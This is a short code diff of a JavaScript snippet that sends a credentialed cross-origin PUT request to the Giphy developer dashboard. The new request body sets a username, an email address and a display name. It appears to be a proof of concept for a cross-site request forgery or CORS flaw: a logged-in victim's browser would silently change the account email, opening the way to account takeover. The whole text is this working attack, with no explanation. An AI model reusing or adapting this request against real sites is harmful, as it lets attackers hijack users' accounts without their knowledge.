@@ -9,7 +9,7 @@ var xhr = new XMLHttpRequest();
         }
     };
     xhr.withCredentials = true;
-    xhr.open("post", "https://developers.giphy.com/dashboard/", true);
+    xhr.open("put", "https://developers.giphy.com/dashboard/", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-    xhr.send("a=5&ok=ok");
+    xhr.send("username=nadamoussab&email=userchange@live.fr&display_name=testmeplsS");
